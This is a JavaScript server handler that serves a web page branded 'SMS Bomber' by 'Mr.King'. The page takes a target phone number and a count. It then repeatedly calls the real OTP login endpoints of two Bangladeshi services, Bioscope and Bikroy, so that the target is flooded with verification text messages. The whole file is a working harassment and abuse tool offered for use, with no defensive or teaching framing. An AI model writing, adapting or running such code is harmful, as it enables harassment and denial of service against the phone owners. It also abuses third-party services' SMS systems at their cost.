// 𝦖 System By: Mr.King ⚔️
// SMS Bomber Tool - Fixed for Website

module.exports = (req, res) => {
    res.send(`
        <html>
        <head>
            <title>𝐒𝐌𝐒 𝐁𝐎𝐎𝐌𝐁𝐄𝐑 ⚔️ 𝐌𝐫.𝐊𝐢𝐧𝐠</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: transparent; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
                .bomb-box { 
                    background: rgba(15, 15, 15, 0.9); 
                    padding: 25px; 
                    border-radius: 20px; 
                    border: 2px solid #ff4757; 
                    box-shadow: 0 0 20px rgba(255, 71, 87, 0.4);
                    max-width: 400px;
                    margin: auto;
                }
                .logo { font-family: monospace; color: #ff4757; font-size: 8px; white-space: pre; margin-bottom: 20px; }
                input { 
                    width: 90%; 
                    padding: 12px; 
                    margin: 10px 0; 
                    background: #000; 
                    border: 1px solid #ff4757; 
                    color: #38ef7d; 
                    border-radius: 10px; 
                    text-align: center;
                    outline: none;
                }
                button { 
                    background: linear-gradient(45deg, #ff4757, #ff6b81); 
                    color: #fff; 
                    padding: 15px; 
                    border: none; 
                    border-radius: 10px; 
                    cursor: pointer; 
                    font-weight: bold; 
                    width: 100%;
                    margin-top: 10px;
                }
                #logs { 
                    margin-top: 20px; 
                    height: 150px; 
                    overflow-y: auto; 
                    background: #000; 
                    padding: 10px; 
                    border-radius: 10px; 
                    font-size: 13px; 
                    text-align: left;
                    border: 1px solid #333;
                }
                .success { color: #38ef7d; }
                .error { color: #ff4757; }
            </style>
        </head>
        <body>
            <div class="bomb-box">
                <div class="logo">
███╗░░░███╗██████╗░░░░██╗░░██╗██╗███╗░░██╗░██████╗░
████╗░████║██╔══██╗░░░██║░██╔╝██║████╗░██║██╔════╝░
██╔████╔██║██████╔╝░░░█████═╝░██║██╔██╗██║██║░░██╗░
██║╚██╔╝██║██╔══██╗░░░██╔═██╗░██║██║╚████║██║░░╚██╗
██║░╚═╝░██║██║░░██║██╗██║░╚██╗██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
                </div>
                <h3 style="color:#ff4757; margin-bottom:15px;">⚔️ SMS BOMBER ⚔️</h3>
                <input type="number" id="num" placeholder="Target Number (Ex: 017xxxxxxxx)">
                <input type="number" id="amt" placeholder="SMS Amount (Max: 100)">
                <button onclick="startAttack()">🚀 LAUNCH ATTACK</button>
                <div id="logs">Waiting for command, Boss... ⚔️</div>
            </div>

            <script>
                async function startAttack() {
                    const phone = document.getElementById('num').value;
                    const amount = document.getElementById('amt').value;
                    const logs = document.getElementById('logs');

                    if(!phone || !amount) return alert("Number and Amount is required! ⚔️");
                    
                    logs.innerHTML = "";
                    let sent = 0;
                    
                    // Clean number: removing leading 0 for Bioscope
                    const cleanNum = phone.startsWith('0') ? phone.substring(1) : phone;

                    for(let i = 1; i <= amount; i++) {
                        try {
                            // API 1: Bioscope
                            await fetch(\`https://www.bioscopelive.com/en/login/send-otp?phone=880\${cleanNum}&operator=bd-otp\`, { mode: 'no-cors' });
                            sent++;
                            logs.innerHTML += \`<div class="success">[✔] \${sent} MR.KING - SMS SENT ✅</div>\`;
                            
                            if(sent >= amount) break;
                            await new Promise(r => setTimeout(r, 500)); // Delay for stability

                            // API 2: Bikroy
                            await fetch(\`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0\${cleanNum}\`, { mode: 'no-cors' });
                            sent++;
                            logs.innerHTML += \`<div class="success">[✔] \${sent} MR.KING - SMS SENT ✅</div>\`;

                        } catch (e) {
                            logs.innerHTML += \`<div class="error">[✘] Connection Error!</div>\`;
                        }
                        
                        logs.scrollTop = logs.scrollHeight;
                        if(sent >= amount) break;
                    }
                    logs.innerHTML += "<hr><div class='success'>✅ MISSION COMPLETE, BOSS! ⚔️</div>";
                }
            </script>
        </body>
        </html>
    `);
};
